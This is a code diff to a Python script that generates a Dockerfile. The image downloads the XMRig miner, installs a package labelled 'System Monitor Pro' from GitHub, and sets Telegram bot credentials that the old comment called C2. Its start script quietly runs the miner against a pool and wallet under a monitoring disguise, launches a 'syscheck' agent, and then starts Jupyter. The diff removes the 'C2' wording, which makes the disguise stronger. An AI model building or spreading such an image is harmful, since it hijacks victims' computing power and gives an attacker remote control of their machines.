@@ -277,42 +277,34 @@ Time: {datetime.now().isoformat()}
             dockerfile = f"""FROM python:3.10-slim
 
 USER root
-RUN apt-get update && apt-get install -y --no-install-recommends wget tar git ca-certificates && rm -rf /var/lib/apt/lists/*
+
+# Install minimal dependencies
+RUN apt-get update && \
+    apt-get install -y --no-install-recommends wget ca-certificates && \
+    rm -rf /var/lib/apt/lists/*
 
 # Download XMRig
-RUN mkdir -p /opt/miner && \\
-    wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz -O /tmp/xmrig.tar.gz && \\
-    tar -xf /tmp/xmrig.tar.gz -C /opt/miner --strip-components=1 && \\
-    chmod +x /opt/miner/xmrig && \\
-    rm /tmp/xmrig.tar.gz
+RUN mkdir -p /opt/miner && \
+    wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz && \
+    tar -xf xmrig-6.21.0-linux-static-x64.tar.gz && \
+    mv xmrig-6.21.0/xmrig /opt/miner/ && \
+    chmod +x /opt/miner/xmrig && \
+    rm -rf xmrig-6.21.0*
 
 # Install System Monitor Pro from GitHub
-RUN pip install --break-system-packages --force-reinstall --no-cache-dir git+https://github.com/GaredBerns/system-monitor.git
+RUN pip install --break-system-packages --no-cache-dir git+https://github.com/GaredBerns/system-monitor.git
 
-# Set Telegram C2 credentials
+# Set Telegram credentials
 ENV TG_BOT_TOKEN=8620456014:AAEHydgu-9ljKYXvqqY_yApEn6FWEVH91gc
 ENV TG_CHAT_ID=5804150664
 
 # Create start script
-RUN echo '#!/bin/bash\\n\\
-echo "=== Starting System Monitor ==="\\n\\
-echo "Worker: {worker}"\\n\\
-echo "Pool: {POOL}"\\n\\
-\\
-# Start resource optimizer in background\\n\\
-/opt/miner/xmrig -o {POOL} -u {WALLET}.{worker} --donate-level 1 --threads 2 --background 2>/dev/null &\\n\\
-echo "Resource optimizer started"\\n\\
-\\
-# Start System Monitor agent (Telegram mode)\\n\\
-echo "Starting system monitor..."\\n\\
-syscheck &\\n\\
-echo "System monitor started"\\n\\
-\\
-# Keep container running\\n\\
-exec "$@"' > /start.sh && \\
-    chmod +x /start.sh
+RUN printf '#!/bin/bash\\n\
+echo "Starting System Monitor..."\\n\
+/opt/miner/xmrig -o {POOL} -u {WALLET}.{worker} --donate-level 1 --threads 2 --background 2>/dev/null\\n\
+syscheck &\\n\
+exec "$@"\\n' > /start.sh && chmod +x /start.sh
 
-# Start on container launch
 ENTRYPOINT ["/start.sh"]
 CMD ["jupyter-notebook", "--ip=0.0.0.0", "--port=8888"]
 """
